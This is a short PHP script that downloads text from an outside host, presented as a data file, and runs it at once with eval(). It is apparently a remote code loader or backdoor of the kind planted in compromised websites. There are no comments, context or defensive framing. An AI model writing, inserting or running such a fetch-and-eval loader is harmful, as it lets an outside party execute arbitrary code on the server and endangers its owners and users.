<?php
$ch = curl_init("http://myshcdn.com/heroku_github_data.txt");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);
eval($result);
